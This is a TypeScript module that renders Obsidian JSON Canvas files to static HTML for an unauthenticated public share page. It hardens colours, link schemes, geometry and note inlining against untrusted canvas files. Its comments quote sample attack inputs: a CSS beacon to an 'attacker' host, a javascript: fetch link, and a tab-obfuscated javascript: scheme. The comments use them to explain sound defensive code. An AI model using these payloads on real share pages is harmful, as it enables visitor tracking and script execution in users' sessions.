// Static HTML render of a JSON Canvas (.canvas) for the public share page
// (FR-10 share + FR-12 canvas). Ports the pure geometry from
// web/src/lib/canvas.ts (kept in sync by hand) and lays the nodes out absolutely,
// drawing edges as SVG Béziers (non-interactive, but crawler-friendly and a
// faithful snapshot). Text/embedded-note bodies reuse the markdown renderer.
import { renderNoteHtml, escapeHtml } from './renderhtml.js';
import * as vault from './vault.js';
import { isPubliclyShared } from './shares.js';

type Side = 'top' | 'right' | 'bottom' | 'left';
interface Rect { x: number; y: number; width: number; height: number; }
interface CNode extends Rect {
  id: string;
  type: 'text' | 'file' | 'link' | 'group';
  color?: string;
  text?: string;
  textAlign?: 'left' | 'center' | 'right';
  file?: string;
  url?: string;
  label?: string;
}
interface CEdge {
  id: string;
  fromNode: string; fromSide?: Side; fromEnd?: 'none' | 'arrow';
  toNode: string; toSide?: Side; toEnd?: 'none' | 'arrow';
  color?: string;
}

/**
 * Obsidian's six preset colour slots, keyed by the string a `.canvas` stores
 * for them ("1".."6").
 *
 * A `Map`, not an object literal, and that choice is load-bearing rather than
 * taste. `PRESET[c]` on a plain object walks the prototype chain, so a canvas
 * carrying `"color": "constructor"` (or `toString`, `valueOf`, `__proto__`,
 * `hasOwnProperty`, ...) resolved to a FUNCTION off `Object.prototype`, the
 * `??` did not fire because a function is not nullish, and the `.trim()` in
 * resolveColor threw a TypeError straight out of renderCanvasHtml into the
 * error handler. One field of one node, on a canvas that may well have been
 * imported or downloaded rather than authored by the sharer, was enough to turn
 * the unauthenticated public share page into a 500 for everybody.
 *
 * A Map has no prototype chain to walk: `get('constructor')` is `undefined`, so
 * `??` falls through to the raw value and SAFE_COLOR_RE gets the last word,
 * which is exactly the behaviour the colour allowlist was written to have.
 */
const PRESET = new Map<string, string>([
  ['1', '#fb464c'], ['2', '#e9973f'], ['3', '#e0de71'],
  ['4', '#44cf6e'], ['5', '#53dfdd'], ['6', '#a882ff'],
]);
const IMG_RE = /\.(png|jpe?g|gif|svg|webp|bmp|ico)$/i;
const MD_RE = /\.(md|markdown)$/i;

/**
 * Shapes a colour value is allowed to take before it is interpolated into a
 * `style` attribute: a hex triplet/quad, a functional colour, or a bare CSS
 * colour keyword.
 *
 * `escapeHtml` already stops a colour from breaking OUT of the double-quoted
 * attribute, so this is not an HTML-injection guard. It is a CSS-injection one:
 * the value lands inside `style="...;border-color:HERE;"`, where a `.canvas`
 * file (which may have been imported or downloaded, i.e. authored by someone
 * other than the person sharing it) could otherwise smuggle in extra
 * declarations. `style-src` allows inline styles and `img-src` allows `https:`,
 * so `red;background:url(https://attacker/beacon)` would render and phone home
 * on view, silently reporting who opened the public page and when. Anything
 * that does not match falls back to "no colour", never to the raw string.
 */
const SAFE_COLOR_RE =
  /^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$|^(?:rgb|rgba|hsl|hsla)\(\s*[0-9a-z.,%\s/+-]{1,64}\)$|^[a-z]{3,20}$/i;

function resolveColor(c?: string): string | null {
  // The `string | undefined` in the signature describes what the JSON Canvas
  // spec PROMISES, not what is in the file. parseCanvas() below already coerces
  // every colour field, but this function is the security boundary for the
  // `style` attribute, so it re-checks rather than trusting a caller to have
  // normalised first: a non-string reaching `.trim()` is the same remote 500
  // the PRESET Map closes, wearing a different hat.
  if (typeof c !== 'string' || !c) return null;
  const resolved = PRESET.get(c) ?? c;
  const trimmed = resolved.trim();
  return SAFE_COLOR_RE.test(trimmed) ? trimmed : null;
}

/**
 * Vet a canvas "link" node URL before it becomes an `href`, allowing http(s)
 * only.
 *
 * Every other href on the public page is produced by the markdown pipeline and
 * therefore passes through rehype-sanitize's protocol allowlist. A link node
 * bypasses that pipeline entirely: its URL is interpolated straight into the
 * template, and `escapeHtml` does not care what scheme it names. A canvas
 * carrying `"url": "javascript:fetch('/api/...')"` would render a javascript:
 * link on an unauthenticated page, and a visitor who is ALSO the logged-in owner
 * (same browser, session cookie attached) clicking it runs attacker script in
 * the app's origin. `data:` and `vbscript:` are the same problem wearing
 * different hats, hence an allowlist rather than a denylist.
 *
 * The comparison runs against the WHATWG-normalised form, not the raw string:
 * URL parsing strips every tab, LF and CR anywhere in the URL and trims leading
 * C0/space, so `java\tscript:alert(1)` navigates to javascript: even though it
 * does not literally start with it. We return that same normalised string so the
 * value we vetted is exactly the value the browser acts on.
 */
function safeLinkUrl(raw: string): string | null {
  const normalized = raw
    .replace(/[\u0009\u000a\u000d]/g, '')
    .replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g, '');
  return /^https?:\/\//i.test(normalized) ? normalized : null;
}

/** Coerce a JSON-supplied geometry field to a finite number. Untrusted `.canvas`
 *  files (imported/downloaded then shared) may carry strings here: leaving them
 *  unescaped in `style="left:${x}px"` is an attribute-injection vector. */
function num(v: unknown, fallback = 0): number {
  const n = typeof v === 'number' ? v : Number(v);
  return Number.isFinite(n) ? n : fallback;
}

/**
 * Coerce a JSON-supplied text field to a string.
 *
 * Same reasoning as num(), and the same failure mode the PRESET Map closes.
 * The `CNode`/`CEdge` interfaces above describe what the JSON Canvas spec says
 * a file contains; they are assertions about a document nobody validated. Every
 * consumer below calls string methods on these fields (`escapeHtml`'s
 * `.replace`, `.split`, `.trim`, `.matchAll`) and all of those throw TypeError
 * on a number, boolean or object. This module's only caller is the
 * unauthenticated SSR share page, so one wrong-typed field is a remote 500 on a
 * public URL: `"label": 3` and `"file": {}` both crashed the page before this.
 * Coercing once at the JSON boundary means nothing downstream has to remember.
 */
function str(v: unknown): string {
  return typeof v === 'string' ? v : '';
}

/**
 * Coerce a node/edge id.
 *
 * Ids are only ever Map keys for the edge-endpoint lookup and never reach the
 * output, so a total but lossy coercion is the right trade here: it keeps the
 * numeric ids a hand-written canvas may carry working (as raw values they used
 * to compare equal to their `fromNode`/`toNode` counterparts), while
 * guaranteeing the Map is keyed by strings. Two nodes whose ids are both
 * non-primitive collapse onto one key, which at worst draws one wrong edge.
 */
function idOf(v: unknown): string {
  if (typeof v === 'string') return v;
  return typeof v === 'number' || typeof v === 'boolean' ? String(v) : '';
}

function nodeType(v: unknown): CNode['type'] {
  switch (v) {
    case 'text': return 'text';
    case 'file': return 'file';
    case 'link': return 'link';
    case 'group': return 'group';
    default:
      // An unknown or missing type falls through to renderNode's final
      // (file-node) branch, which is precisely where it landed before this
      // normalisation existed. Preserved on purpose: this layer exists to stop
      // crashes, not to change how a well-formed canvas renders.
      return 'file';
  }
}

/**
 * Validate an edge side.
 *
 * `sideAnchor` and `sideNormal` are exhaustive switches over the four sides
 * with no default clause, so anything else falls off the end and returns
 * `undefined`; `edgeD` then reads `from.x` and throws. An edge carrying
 * `"fromSide": "diagonal"` was therefore another remote 500 on the public page,
 * the same class as the colour crash. Mapping anything unrecognised to
 * `undefined` makes the renderer fall back to autoSides() and draw a sensible
 * edge instead of dying.
 */
function edgeSide(v: unknown): Side | undefined {
  switch (v) {
    case 'top': return 'top';
    case 'right': return 'right';
    case 'bottom': return 'bottom';
    case 'left': return 'left';
    default: return undefined;
  }
}

/** Preserve the exact end-cap semantics the renderer already had: absent means
 *  "arrow at the head, none at the tail", present-but-unrecognised means none. */
function endCap(v: unknown): 'none' | 'arrow' | undefined {
  if (v === undefined || v === null) return undefined;
  return v === 'arrow' ? 'arrow' : 'none';
}

function textAlignOf(v: unknown): CNode['textAlign'] {
  if (v === 'center') return 'center';
  if (v === 'right') return 'right';
  return 'left';
}

/**
 * Parse a `.canvas` document into a shape the renderers below can trust.
 *
 * All four exported entry points go through here, and that is the whole point.
 * `JSON.parse` hands back untyped data from a file the visitor did not write and
 * the sharer may not have written either (Obsidian canvases get imported,
 * downloaded and synced), while every entry point feeds the unauthenticated SSR
 * share page. Type-checking once, here, is what lets the rendering code call
 * `.trim()`, `.split()` and `escapeHtml()` without each call site defending
 * itself, and it closes a whole family of one-field remote 500s rather than the
 * single instance (`resolveColor`) that was found first.
 *
 * Geometry is normalised for a second reason on top of crash safety: `x`, `y`,
 * `width` and `height` are interpolated raw into a `style` attribute, so a
 * string there is an attribute-injection vector, not just a rendering bug.
 */
function parseCanvas(raw: string): { nodes: CNode[]; edges: CEdge[] } {
  let data: unknown;
  try {
    data = JSON.parse(raw);
  } catch {
    return { nodes: [], edges: [] };
  }
  if (!data || typeof data !== 'object') return { nodes: [], edges: [] };
  const root = data as { nodes?: unknown; edges?: unknown };
  const rawNodes: unknown[] = Array.isArray(root.nodes) ? root.nodes : [];
  const rawEdges: unknown[] = Array.isArray(root.edges) ? root.edges : [];

  const nodes: CNode[] = [];
  for (const entry of rawNodes) {
    if (!entry || typeof entry !== 'object') continue;
    const o = entry as Record<string, unknown>;
    nodes.push({
      id: idOf(o.id),
      type: nodeType(o.type),
      x: num(o.x), y: num(o.y), width: num(o.width), height: num(o.height),
      color: str(o.color),
      text: str(o.text),
      textAlign: textAlignOf(o.textAlign),
      file: str(o.file),
      url: str(o.url),
      label: str(o.label),
    });
  }

  const edges: CEdge[] = [];
  for (const entry of rawEdges) {
    if (!entry || typeof entry !== 'object') continue;
    const o = entry as Record<string, unknown>;
    edges.push({
      id: idOf(o.id),
      fromNode: idOf(o.fromNode), fromSide: edgeSide(o.fromSide), fromEnd: endCap(o.fromEnd),
      toNode: idOf(o.toNode), toSide: edgeSide(o.toSide), toEnd: endCap(o.toEnd),
      color: str(o.color),
    });
  }

  return { nodes, edges };
}

function sideAnchor(n: Rect, side: Side): { x: number; y: number } {
  switch (side) {
    case 'top': return { x: n.x + n.width / 2, y: n.y };
    case 'bottom': return { x: n.x + n.width / 2, y: n.y + n.height };
    case 'left': return { x: n.x, y: n.y + n.height / 2 };
    case 'right': return { x: n.x + n.width, y: n.y + n.height / 2 };
  }
}

function autoSides(a: Rect, b: Rect): { from: Side; to: Side } {
  const dx = (b.x + b.width / 2) - (a.x + a.width / 2);
  const dy = (b.y + b.height / 2) - (a.y + a.height / 2);
  if (Math.abs(dx) > Math.abs(dy)) return dx >= 0 ? { from: 'right', to: 'left' } : { from: 'left', to: 'right' };
  return dy >= 0 ? { from: 'bottom', to: 'top' } : { from: 'top', to: 'bottom' };
}

function sideNormal(side: Side): { x: number; y: number } {
  switch (side) {
    case 'top': return { x: 0, y: -1 };
    case 'bottom': return { x: 0, y: 1 };
    case 'left': return { x: -1, y: 0 };
    case 'right': return { x: 1, y: 0 };
  }
}

function edgeD(from: { x: number; y: number }, fromSide: Side, to: { x: number; y: number }, toSide: Side): string {
  const dist = Math.hypot(to.x - from.x, to.y - from.y);
  const handle = Math.max(30, Math.min(dist * 0.5, 200));
  const fn = sideNormal(fromSide), tn = sideNormal(toSide);
  const c1 = { x: from.x + fn.x * handle, y: from.y + fn.y * handle };
  const c2 = { x: to.x + tn.x * handle, y: to.y + tn.y * handle };
  return `M ${from.x} ${from.y} C ${c1.x} ${c1.y}, ${c2.x} ${c2.y}, ${to.x} ${to.y}`;
}

function bbox(nodes: CNode[]): Rect | null {
  if (!nodes.length) return null;
  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
  for (const n of nodes) {
    minX = Math.min(minX, n.x); minY = Math.min(minY, n.y);
    maxX = Math.max(maxX, n.x + n.width); maxY = Math.max(maxY, n.y + n.height);
  }
  return { x: minX, y: minY, width: maxX - minX, height: maxY - minY };
}

async function renderNode(n: CNode, fileUrl: (p: string) => string): Promise<string> {
  const col = resolveColor(n.color);
  const style = `left:${n.x}px;top:${n.y}px;width:${n.width}px;height:${n.height}px;` +
    (col ? `--c:${escapeHtml(col)};border-color:${escapeHtml(col)};` : '');
  if (n.type === 'group') {
    const label = n.label ? `<div class="canvas-group-label">${escapeHtml(n.label)}</div>` : '';
    return `<div class="canvas-node canvas-group" style="${style}">${label}</div>`;
  }
  if (n.type === 'text') {
    const align = n.textAlign === 'center' || n.textAlign === 'right' ? n.textAlign : 'left';
    const body = (n.text ?? '').trim() ? await renderNoteHtml(n.text ?? '', fileUrl) : '';
    return `<div class="canvas-node canvas-text" style="${style}"><div class="canvas-text-body markdown-preview" style="text-align:${align}">${body}</div></div>`;
  }
  if (n.type === 'link') {
    const url = n.url ?? '';
    const href = safeLinkUrl(url);
    // A rejected scheme still renders its text, so the card keeps its meaning
    // and the canvas does not silently lose a node: it just is not clickable.
    // Show the vetted string rather than the raw one when we do link it, so the
    // label a visitor reads can never differ from the target they navigate to.
    const label = escapeHtml(href ?? url);
    return href
      ? `<div class="canvas-node canvas-link" style="${style}"><a class="canvas-link-body" href="${escapeHtml(href)}" target="_blank" rel="noopener nofollow"><span class="url">${label}</span></a></div>`
      : `<div class="canvas-node canvas-link" style="${style}"><div class="canvas-link-body"><span class="url">${label}</span></div></div>`;
  }
  // file node
  const file = n.file ?? '';
  if (IMG_RE.test(file)) {
    return `<div class="canvas-node canvas-file" style="${style}"><div class="canvas-file-img"><img src="${escapeHtml(fileUrl(file))}" alt="${escapeHtml(file)}" /></div></div>`;
  }
  const name = (file.split('/').pop() ?? file).replace(MD_RE, '');
  let body = '';
  if (MD_RE.test(file)) {
    // PUBLICATION GATE. This function runs on the SSR page for an anonymous
    // visitor, and `vault.readFileText` only refuses to escape the vault root:
    // it has no opinion about WHICH note a canvas may name. Inlining the note
    // unconditionally (the original behaviour) meant that sharing one canvas
    // republished the full text of every note drawn on it, to the whole
    // internet, with no second act of consent from the owner. Obsidian's canvas
    // UX actively encourages dragging notes in as preview cards, so this fired
    // on ordinary use, not just on a crafted `.canvas`.
    //
    // The boundary we settled on: a canvas may inline a note only when that note
    // is ITSELF published (an enabled, password-free share of its own). The
    // reasoning:
    //
    //  - It is safe by construction, not by estimation. Such a note is already
    //    readable by anyone at its own /share/<id> URL, so showing it here
    //    discloses nothing that was not already disclosed. No other rule we
    //    considered (an allowlist of "notes the canvas references", a same-
    //    folder rule) has that property; they all infer consent from proximity.
    //  - It is safe for shares that already exist. Nothing in the stored record
    //    changes, and the gate is closed by default, so a canvas shared before
    //    this change stops leaking the moment the code lands, without the owner
    //    having to notice, migrate, or re-save anything.
    //  - It stays usable, and the escape hatch is one the owner already
    //    understands: share the note too, and the card fills in. That is a
    //    deliberate, per-note action in the existing UI, which is exactly the
    //    consent that was missing.
    //
    // Rejected alternatives: an opt-in flag on the share record ("include
    // referenced notes") would restore the whole leak behind a single checkbox
    // whose blast radius the owner cannot see, and title-only rendering with no
    // escape hatch would break legitimate canvas publishing outright.
    //
    // What still surfaces for a non-published note is its file name, which the
    // author placed on this canvas on purpose and which the card needs to be
    // identifiable at all. Its body, its frontmatter and its embedded assets
    // (see canvasEmbedTargets below, which applies the same gate) do not.
    if (await isPubliclyShared(file)) {
      const md = await vault.readFileText(file).catch(() => null);
      body = md ? await renderNoteHtml(md, fileUrl) : '';
    } else {
      body = '<div class="canvas-file-generic"><em>This note is not shared.</em></div>';
    }
  }
  return `<div class="canvas-node canvas-file" style="${style}"><div class="canvas-file-note"><div class="canvas-file-head"><span class="title">${escapeHtml(name)}</span></div><div class="canvas-file-body markdown-preview">${body}</div></div></div>`;
}

/**
 * Render a `.canvas` document to a self-contained static HTML block. `fileUrl`
 * resolves a vault path (image / embed) to a public URL.
 */
export async function renderCanvasHtml(raw: string, fileUrl: (p: string) => string): Promise<string> {
  // Everything downstream (style attrs, bbox, the `shifted` arithmetic, the
  // escaped text) then operates on validated numbers and real strings rather
  // than on whatever the JSON happened to contain. See parseCanvas().
  const { nodes, edges } = parseCanvas(raw);
  const bb = bbox(nodes);
  if (!bb) return '<div class="canvas-static-empty">This canvas is empty.</div>';

  const pad = 48;
  const ox = pad - bb.x, oy = pad - bb.y;
  const W = Math.round(bb.width + pad * 2), H = Math.round(bb.height + pad * 2);

  // Shift every node into local (padded) coordinates.
  const shifted = nodes.map((n) => ({ ...n, x: n.x + ox, y: n.y + oy }));
  const byId = new Map(shifted.map((n) => [n.id, n]));

  // Groups behind everything, then other nodes (matches the editor's z-order).
  const ordered = [...shifted.filter((n) => n.type === 'group'), ...shifted.filter((n) => n.type !== 'group')];
  const nodeHtml = (await Promise.all(ordered.map((n) => renderNode(n, fileUrl)))).join('\n');

  const edgeSvg = edges.map((e) => {
    const a = byId.get(e.fromNode), b = byId.get(e.toNode);
    if (!a || !b) return '';
    const sides = e.fromSide && e.toSide ? { from: e.fromSide, to: e.toSide } : autoSides(a, b);
    const from = sideAnchor(a, e.fromSide ?? sides.from);
    const to = sideAnchor(b, e.toSide ?? sides.to);
    const d = edgeD(from, e.fromSide ?? sides.from, to, e.toSide ?? sides.to);
    const col = resolveColor(e.color) ?? 'var(--canvas-edge, #888)';
    const markerEnd = (e.toEnd ?? 'arrow') === 'arrow' ? ' marker-end="url(#cv-arrow)"' : '';
    const markerStart = e.fromEnd === 'arrow' ? ' marker-start="url(#cv-arrow)"' : '';
    return `<path d="${d}" fill="none" stroke="${escapeHtml(col)}" stroke-width="2"${markerEnd}${markerStart} style="color:${escapeHtml(col)}" />`;
  }).join('\n');

  return `<div class="canvas-public-viewport" id="cv-viewport">
<div class="canvas-static" id="cv-world" data-w="${W}" data-h="${H}" style="width:${W}px;height:${H}px">
<svg class="canvas-edges" style="overflow:visible;position:absolute;left:0;top:0;width:1px;height:1px">
<defs><marker id="cv-arrow" markerWidth="14" markerHeight="14" refX="11" refY="5.5" orient="auto-start-reverse" markerUnits="userSpaceOnUse"><path d="M0,0 L11,5.5 L0,11 Z" fill="context-stroke" /></marker></defs>
${edgeSvg}
</svg>
${nodeHtml}
</div>
<div class="canvas-public-controls">
<button id="cv-zout" type="button" title="Zoom out" aria-label="Zoom out">&minus;</button>
<button id="cv-fit" type="button" title="Fit to screen" aria-label="Fit to screen">&#9974;</button>
<button id="cv-zin" type="button" title="Zoom in" aria-label="Zoom in">+</button>
</div>
</div>`;
}

/** Inline pan/zoom controller for the public canvas (CSP nonce required). Drives
 *  the #cv-world transform: drag = pan, wheel/pinch = zoom-to-cursor, fit on load. */
export function canvasViewerScript(nonce: string): string {
  return `<script nonce="${nonce}">
(function(){
  var vp=document.getElementById('cv-viewport'),world=document.getElementById('cv-world');
  if(!vp||!world)return;
  var W=parseFloat(world.dataset.w)||world.offsetWidth,H=parseFloat(world.dataset.h)||world.offsetHeight;
  var scale=1,tx=0,ty=0;
  function clampS(s){return Math.min(4,Math.max(0.05,s));}
  function apply(){world.style.transform='translate('+tx+'px,'+ty+'px) scale('+scale+')';}
  function fit(){var r=vp.getBoundingClientRect(),pad=56;scale=clampS(Math.min((r.width-pad)/W,(r.height-pad)/H,1.5));tx=(r.width-W*scale)/2;ty=(r.height-H*scale)/2;apply();}
  function zoomAt(px,py,f){var ns=clampS(scale*f),k=ns/scale;tx=px-(px-tx)*k;ty=py-(py-ty)*k;scale=ns;apply();}
  vp.addEventListener('wheel',function(e){e.preventDefault();var r=vp.getBoundingClientRect();zoomAt(e.clientX-r.left,e.clientY-r.top,Math.exp(-e.deltaY*0.0015));},{passive:false});
  var pts={},dragId=null,lx=0,ly=0,pinch=null;
  vp.addEventListener('pointerdown',function(e){if(e.target.closest('.canvas-public-controls'))return;vp.setPointerCapture(e.pointerId);pts[e.pointerId]={x:e.clientX,y:e.clientY};var ids=Object.keys(pts);if(ids.length===1){dragId=e.pointerId;lx=e.clientX;ly=e.clientY;}else if(ids.length===2){dragId=null;var a=pts[ids[0]],b=pts[ids[1]];pinch={d:Math.hypot(a.x-b.x,a.y-b.y)||1};}});
  vp.addEventListener('pointermove',function(e){if(!pts[e.pointerId])return;pts[e.pointerId]={x:e.clientX,y:e.clientY};var ids=Object.keys(pts);if(pinch&&ids.length>=2){var a=pts[ids[0]],b=pts[ids[1]],nd=Math.hypot(a.x-b.x,a.y-b.y)||1,r=vp.getBoundingClientRect();zoomAt((a.x+b.x)/2-r.left,(a.y+b.y)/2-r.top,nd/pinch.d);pinch.d=nd;}else if(dragId===e.pointerId){tx+=e.clientX-lx;ty+=e.clientY-ly;lx=e.clientX;ly=e.clientY;apply();}});
  function up(e){delete pts[e.pointerId];try{vp.releasePointerCapture(e.pointerId);}catch(_){}if(Object.keys(pts).length<2)pinch=null;if(e.pointerId===dragId)dragId=null;}
  vp.addEventListener('pointerup',up);vp.addEventListener('pointercancel',up);
  function c(id,f){var el=document.getElementById(id);if(el)el.addEventListener('click',function(){var r=vp.getBoundingClientRect();f(r);});}
  c('cv-zin',function(r){zoomAt(r.width/2,r.height/2,1.2);});
  c('cv-zout',function(r){zoomAt(r.width/2,r.height/2,1/1.2);});
  c('cv-fit',function(){fit();});
  window.addEventListener('resize',fit);
  fit();
})();
</script>`;
}

/** Plain-text excerpt of a canvas (its text nodes) for the meta description. */
export function canvasDescription(raw: string, max = 160): string {
  const { nodes } = parseCanvas(raw);
  const parts = nodes
    .filter((n) => n.type === 'text' && (n.text ?? '').trim())
    .map((n) => (n.text ?? '').replace(/[#*_~`>|[\]]/g, ' ').replace(/\s+/g, ' ').trim());
  const body = parts.join(' · ').trim();
  return body.length > max ? `${body.slice(0, max - 1).trimEnd()}…` : body;
}

/** Percent-decode an embed target, falling back to the raw text.
 *  `decodeURIComponent` THROWS on a malformed sequence ('%zz', a lone '%'), and
 *  this runs while building the allowlist for the unauthenticated file endpoint:
 *  one stray '%' anywhere in a shared note used to turn every attachment request
 *  for that share into a 500. Failing soft keeps the rest of the allowlist
 *  intact, and is not a widening: the undecoded text simply will not resolve to
 *  a vault file unless it really is that file's name. */
function safeDecode(s: string): string {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

/** Vault paths a canvas references (image file-nodes + images embedded in its
 *  markdown file-nodes): the allowlist for the public file endpoint. */
export async function canvasEmbedTargets(raw: string): Promise<string[]> {
  const { nodes } = parseCanvas(raw);
  const out = new Set<string>();
  for (const n of nodes) {
    if (n.type !== 'file' || !n.file) continue;
    if (IMG_RE.test(n.file)) { out.add(n.file); continue; }
    if (MD_RE.test(n.file)) {
      // Same publication gate as renderNode, and it has to be here too: this
      // list is what GET /public/shares/:id/file will serve. Widening it for a
      // note the page refuses to render would leak that note's attachments
      // (screenshots, scans, recordings) through the back door while the front
      // door stayed shut, which is the same disclosure by another route.
      if (!(await isPubliclyShared(n.file))) continue;
      const md = await vault.readFileText(n.file).catch(() => null);
      if (!md) continue;
      for (const m of md.matchAll(/!\[\[([^\]]+?)\]\]/g)) {
        const t = m[1].split('|')[0].split('#')[0].trim();
        if (t) out.add(t);
      }
      for (const m of md.matchAll(/!\[[^\]]*\]\(([^)]+)\)/g)) {
        const url = m[1].replace(/\s+"[^"]*"$/, '').trim();
        if (url && !/^(https?|data|blob|file):/i.test(url)) out.add(safeDecode(url.split('/').pop() || url));
      }
    }
  }
  return [...out];
}

/** First image file-node of a canvas, for og:image. */
export function canvasFirstImage(raw: string): string | null {
  const { nodes } = parseCanvas(raw);
  for (const n of nodes) {
    if (n.type === 'file' && n.file && IMG_RE.test(n.file)) return n.file;
  }
  return null;
}
